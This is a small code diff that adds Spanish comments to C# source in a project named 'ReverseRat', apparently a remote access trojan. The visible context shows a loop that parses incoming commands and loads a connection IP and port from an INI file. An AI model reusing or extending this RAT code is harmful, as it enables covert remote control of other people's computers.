@@ -81,7 +81,7 @@ namespace ReverseRat
 
             while (true)
             {
-                try
+                try // Parser de comandos
                 {
                     _strInput.Append(_streamReader.ReadLine());
                     _strInput.Append("\n");
@@ -192,9 +192,9 @@ namespace ReverseRat
             _streamWriter.Flush();
         }
 
-
         private void Form1_Load(object sender, EventArgs e)
         {
+            // Cargar opciones de Ini
             var myIni = new IniFile("opciones.ini");
             _ipConexion= myIni.Read("DefaultIP","opciones");
             _puertoConexion = myIni.Read("DefaultPort", "opciones");
